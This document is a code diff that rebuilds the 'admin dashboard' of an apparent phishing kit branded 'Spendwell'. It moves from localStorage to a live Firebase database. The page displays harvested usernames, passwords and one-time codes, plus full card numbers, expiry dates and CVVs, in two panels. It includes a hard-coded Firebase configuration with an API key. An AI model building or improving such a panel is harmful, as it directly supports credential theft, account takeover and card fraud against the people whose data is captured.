@@ -1,80 +1,237 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex" />
+  <title>Spendwell — Admin Dashboard (Demo)</title>
 
-    <style>
-        body {font-family: Arial, sans-serif;}
-        #logs {margin-top: 20px;}
-        .entry {
-            border: 1px solid #ccc;
-            padding: 10px;
-            margin-bottom: 10px;
-            background: #f9f9f9;
-        }
+  <style>
+    :root{
+      --bg: #0f1220;
+      --panel: #171a2b;
+      --panel-2:#1c2033;
+      --text: #eef1ff;
+      --muted:#9aa4c7;
+      --accent:#6ea8fe;
+      --accent-2:#9b83ff;
+      --danger:#ff5d6c;
+      --good:#3bd184;
+      --chip:#2a3150;
+      --border:#263055;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      color:var(--text);
+      background: radial-gradient(1200px 800px at 20% -10%, #1b1d35 0%, #0f1220 40%) no-repeat, var(--bg);
+    }
 
-        button {
-            padding: 8px 15px;
-            background: red;
-            border: none;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-        }
+    /* Header */
+    .nav{
+      display:flex; align-items:center; justify-content:space-between;
+      padding:16px 20px; position:sticky; top:0; backdrop-filter: blur(6px);
+      background: linear-gradient(180deg, rgba(15,18,32,.75), rgba(15,18,32,.3));
+      border-bottom: 1px solid rgba(255,255,255,.06);
+      z-index:5;
+    }
+    .brand{
+      display:flex; gap:10px; align-items:center; font-weight:700; letter-spacing:.3px;
+    }
+    .brand .dot{width:10px; height:10px; border-radius:50%; background:linear-gradient(135deg,var(--accent),var(--accent-2)); box-shadow:0 0 14px rgba(110,168,254,.6)}
+    .demo-chip{
+      font-size:12px; padding:3px 8px; border-radius:999px; background: var(--chip); color:var(--muted);
+      border:1px solid rgba(255,255,255,.06);
+    }
 
-        button:hover {
-            background: darkred;
-        }
-    </style>
+    /* Layout */
+    .wrap{max-width:1100px; margin:24px auto; padding:0 16px}
+    .toolbar{
+      display:flex; gap:10px; align-items:center; flex-wrap:wrap; margin: 6px 0 18px;
+    }
+    .btn{
+      appearance:none; border:none; border-radius:10px; padding:10px 14px; font-weight:600; cursor:pointer;
+      color:#0f1220; background: linear-gradient(135deg,var(--accent),var(--accent-2));
+      box-shadow: 0 8px 24px rgba(110,168,254,.25);
+    }
+    .btn:disabled{opacity:.6; cursor:not-allowed}
+    .btn--outline{
+      background:transparent; color:var(--text); border:1px solid var(--border); box-shadow:none;
+    }
+    .meta{color:var(--muted); font-size:14px}
 
+    .grid{
+      display:grid; gap:16px;
+      grid-template-columns: 1fr;
+    }
+    @media (min-width: 880px){
+      .grid{ grid-template-columns: 1fr 1fr; }
+    }
+
+    /* Panels */
+    .panel{
+      background: linear-gradient(180deg, var(--panel), var(--panel-2));
+      border:1px solid var(--border);
+      border-radius:16px; padding:16px 14px 10px;
+      box-shadow: 0 8px 28px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.03);
+      min-height: 280px;
+    }
+    .panel h3{margin:2px 2px 10px; font-size:18px}
+    .panel .count{
+      font-size:13px; color:var(--muted); margin: -4px 2px 12px;
+    }
+
+    /* Entries */
+    .entry{
+      border:1px solid var(--border);
+      background: rgba(255,255,255,.02);
+      border-radius:12px; padding:12px; margin:10px 0;
+    }
+    .entry strong{color:#fff}
+    .kv{display:grid; grid-template-columns: 110px 1fr; gap:6px 10px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; font-size:13px}
+    .k{color:var(--muted)}
+    .v{color:#e9ecff; word-break: break-word}
+    .tag{display:inline-block; padding:2px 8px; border-radius:999px; font-size:12px; margin-right:6px; background:#1e2747; border:1px solid var(--border); color:#b7c3ff}
+    .time{font-size:12px; color:var(--muted); margin-top:8px}
+
+    .empty{padding:18px; text-align:center; color:var(--muted); border:1px dashed var(--border); border-radius:12px; background:rgba(255,255,255,.02)}
+
+    /* Footer */
+    footer{opacity:.7; font-size:12px; color:var(--muted); padding:18px 0; text-align:center}
+  </style>
 </head>
 <body>
-    <h2>Admin Dashboard</h2>
-    <button id="clearBtn">Clear Logs</button>
-    <div id="logs"></div>
-    
-    <script>
-        function loadLogs() {
-          const logs = JSON.parse(localStorage.getItem("logs")) || [];
-          const logsDiv = document.getElementById('logs');
-          logsDiv.innerHTML = "";
-      
-          if (logs.length > 0) {
-            logs.forEach((entry, index) => {
-              const div = document.createElement('div');
-              div.className = 'entry';
-              div.innerHTML =
-                `#${index + 1}<br>` +
-                (entry.username ? `Username: ${entry.username}<br>` : "") +
-                (entry.password ? `Password: ${entry.password}<br>` : "") +
-                (entry.otp ? `OTP: ${entry.otp}<br>` : "") +
-                (entry.ccName ? `Card Name: ${entry.ccName}<br>` : "") +
-                (entry.ccNumber ? `Card Number: ${entry.ccNumber}<br>` : "") +
-                (entry.ccExp ? `Expiry: ${entry.ccExp}<br>` : "") +
-                (entry.ccCvv ? `CVV: ${entry.ccCvv}<br>` : "") +
-                `Time: ${entry.time}<br><hr>`;
-              logsDiv.appendChild(div);
-            });
-            
-          } else {
-            logsDiv.innerText = "No logs found.";
-          }
+  <header class="nav">
+    <div class="brand">
+      <span class="dot" aria-hidden="true"></span>
+      <span>Spendwell Admin</span>
+    </div>
+    <div class="toolbar">
+      <button id="clearBtn" class="btn btn--outline" title="Clear all logs">Clear All</button>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="grid">
+      <div class="panel">
+        <h3>User Logins</h3>
+        <div id="userCount" class="count">0 entries</div>
+        <div id="userLogs" aria-live="polite"></div>
+      </div>
+
+      <div class="panel">
+        <h3>Card Logins</h3>
+        <div id="cardCount" class="count">0 entries</div>
+        <div id="cardLogs" aria-live="polite"></div>
+      </div>
+    </section>
+  </main>
+
+  <footer>© <span id="y"></span> Spendwell • Admin (Demo)</footer>
+
+  <!-- Firebase + Admin logic -->
+  <script type="module">
+    document.getElementById("y").textContent = new Date().getFullYear();
+
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
+    import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyC8mj_ZYR5wboTaEzHzq-YyNmkmTyJ6MQ8",
+      authDomain: "spendwell-efc54.firebaseapp.com",
+      databaseURL: "https://spendwell-efc54-default-rtdb.firebaseio.com",
+      projectId: "spendwell-efc54",
+      storageBucket: "spendwell-efc54.firebasestorage.app",
+      messagingSenderId: "55289622692",
+      appId: "1:55289622692:web:f7ded1b00b089cf24cf631"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const userLogsEl = document.getElementById("userLogs");
+    const cardLogsEl = document.getElementById("cardLogs");
+    const userCountEl = document.getElementById("userCount");
+    const cardCountEl = document.getElementById("cardCount");
+    const clearBtn = document.getElementById("clearBtn");
+
+    function renderEmpty(el, text){
+      el.innerHTML = `<div class="empty">${text}</div>`;
+    }
+
+    // Live listener
+    onValue(ref(db, "logs"), (snapshot) => {
+      userLogsEl.innerHTML = "";
+      cardLogsEl.innerHTML = "";
+
+      if (!snapshot.exists()){
+        userCountEl.textContent = "0 entries";
+        cardCountEl.textContent = "0 entries";
+        renderEmpty(userLogsEl, "No user logins yet.");
+        renderEmpty(cardLogsEl, "No card logins yet.");
+        return;
+      }
+
+      // Collect & sort by time desc
+      const items = [];
+      snapshot.forEach(child => items.push(child.val()));
+      items.sort((a,b) => new Date(b.time) - new Date(a.time));
+
+      let userCount = 0, cardCount = 0;
+
+      for (const entry of items){
+        // USER LOGINS
+        if (entry.username && entry.password){
+          userCount++;
+          const div = document.createElement("div");
+          div.className = "entry";
+          div.innerHTML = `
+            <span class="tag">User Login</span>
+            <div class="kv" role="list">
+              <div class="k">Username</div><div class="v">${entry.username}</div>
+              <div class="k">Password</div><div class="v">${entry.password}</div>
+              <div class="k">OTP</div><div class="v">${entry.otp || "—"}</div>
+            </div>
+            <div class="time">Time: ${entry.time || "—"}</div>
+          `;
+          userLogsEl.appendChild(div);
+          continue;
         }
-      
-        loadLogs();
-      
-        const clearBtn = document.getElementById('clearBtn');
-        if (clearBtn) {
-          clearBtn.addEventListener('click', () => {
-            if (confirm('Are you sure you want to clear all logs?')) {
-              localStorage.removeItem('logs');
-              loadLogs();
-            }
-          });
+
+        // CARD LOGINS
+        if (entry.cardholder && entry.number){
+          cardCount++;
+          const div = document.createElement("div");
+          div.className = "entry";
+          div.innerHTML = `
+            <span class="tag">Card Login</span>
+            <div class="kv" role="list">
+              <div class="k">Cardholder</div><div class="v">${entry.cardholder}</div>
+              <div class="k">Number</div><div class="v">${entry.number}</div>
+              <div class="k">Expiry</div><div class="v">${entry.expiry}</div>
+              <div class="k">CVV</div><div class="v">${entry.cvv}</div>
+            </div>
+            <div class="time">Time: ${entry.time || "—"}</div>
+          `;
+          cardLogsEl.appendChild(div);
         }
-      </script>
-      
+      }
+
+      // Counts + empty states
+      userCountEl.textContent = `${userCount} ${userCount === 1 ? "entry" : "entries"}`;
+      cardCountEl.textContent = `${cardCount} ${cardCount === 1 ? "entry" : "entries"}`;
+      if (userCount === 0) renderEmpty(userLogsEl, "No user logins yet.");
+      if (cardCount === 0) renderEmpty(cardLogsEl, "No card logins yet.");
+    });
+
+    // Clear everything
+    clearBtn.addEventListener("click", async () => {
+      if (confirm("This will permanently delete all logs. Continue?")){
+        await remove(ref(db, "logs"));
+      }
+    });
+  </script>
 </body>
 </html>
